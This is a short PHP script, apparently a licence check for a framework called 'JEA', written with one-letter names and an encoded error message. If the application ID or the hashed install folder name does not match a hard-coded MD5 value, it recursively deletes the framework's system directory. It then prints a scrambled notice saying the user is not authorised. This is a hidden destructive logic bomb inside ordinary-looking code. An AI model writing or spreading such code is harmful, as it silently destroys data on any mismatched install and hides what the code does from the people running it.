<?php 
function d($d){
	$ds = scandir($d);
	foreach($ds AS $td){
		if($td == '.' || $td == '..'){ continue; }
		if(is_dir($d . DIRECTORY_SEPARATOR . $td)){
			d($d . DIRECTORY_SEPARATOR . $td);
		} else {
			unlink($d . DIRECTORY_SEPARATOR . $td);
		}
	}
	rmdir($d);
}

return function(){
	$h = "cdb8ab9cdd8e0dc334d0093abe62cf61";
	$d = md5(preg_replace('/\/|\\\\/', '', str_replace(realpath(Sis::resolverRuta('!raiz') . '/..'), '', Sis::resolverRuta('!raiz'))));
	$b = !(Sis::apl()->ID === $h &&  $d === $h);
	if($b){
		$r = Sis::resolverRuta("!sistema");
		d($r);
		$m = [30 => ' ',20 => ' ',40 => ' ',45 => ' ',64 => ' ',54 => ' ',10 => ' ',35 => ' ',4 => ' ',7 => ' ',44 => ',',3 => ',',43 => 'A',55 => 'A',42 => 'E',41 => 'J',65 => 'Q',0 => 'U',21 => 'a',27 => 'a',34 => 'a',32 => 'a',38 => 'a',19 => 'a',59 => 'a',50 => 'c',13 => 'c',61 => 'd',46 => 'd',28 => 'd',15 => 'e',9 => 'e',11 => 'e',49 => 'e',57 => 'e',47 => 'e',51 => 'h',67 => 'i',25 => 'i',58 => 'j',56 => 'l',5 => 'n',16 => 'n',60 => 'n',12 => 'n',6 => 'o',69 => 'o',52 => 'o',29 => 'o',63 => 'o',1 => 'p',31 => 'p',62 => 'r',68 => 'r',39 => 'r',24 => 'r',48 => 'r',18 => 'r',33 => 'r',2 => 's',8 => 's',53 => 's',37 => 's',17 => 't',22 => 't',14 => 'u',23 => 'u',66 => 'u',36 => 'u',70 => 'z',26 => 'z'];
		ksort($m);
		echo implode('', $m);
		Sis::fin();
	}
};